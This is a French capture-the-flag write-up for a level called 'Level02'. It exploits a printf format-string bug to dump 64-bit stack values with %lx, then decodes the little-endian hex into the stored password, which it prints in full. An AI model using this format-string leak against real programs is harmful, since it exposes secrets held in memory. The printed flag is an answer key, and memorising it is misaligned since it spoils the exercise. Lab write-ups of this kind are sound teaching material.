# Level02

## **Réflexion :**

Dans le `main`, le contenu du mot de passe du niveau suivant est stocké sur la **stack** à l'aide d'un `fread`.

On aurait pu aller regarder l'état de la **pile** directement avec **gdb** mais son utilisation est bloquée.

À la fin du `main` on trouve un `printf` vulnérable au **format string**.

De fait, on va utiliser la **format string** pour **dump** des parties de la **stack** jusqu'à retrouver le mot de passe en question.

En cherchant un peu, on se rend compte que la string générée par `printf` est placée en 28ème position sur la **pile**.

On peut en conclure que notre mot de passe est placé avant la 28ème valeur sur la **stack**, on sait également que son buffer est placé entre deux autres buffers qui ont été `bzero` au début du `main`.


## **Tests :**

En imprimant les valeurs en hexadécimales à l'aide de `%lx` (ici on utilise le modificateur de longueur `l` car nous sommes en 64 bits) on peut observer 5 fois 8 octets à la suite (un mot de passe est composé de 40 caractères) délimités par deux 0 :

```bash
python -c 'print("%21$lx %22$lx %23$lx %24$lx %25$lx %26$lx %27$lx")' | ./level02
```

```
0 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 0 does not have access!
```


## **Solution :**

Il ne nous reste plus qu'à afficher nos 5 valeurs en **ASCII** après les avoir reverses vu qu'on est en **little endian** :

```python
print("\x75\x6e\x50\x52\x34\x37\x68\x48"[::-1], end='')
print("\x45\x41\x4a\x35\x61\x73\x39\x51"[::-1], end='')
print("\x37\x7a\x71\x43\x57\x4e\x67\x58"[::-1], end='')
print("\x35\x4a\x35\x68\x6e\x47\x58\x73"[::-1], end='')
print("\x48\x33\x67\x50\x66\x4b\x39\x4d"[::-1])
```

>> Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H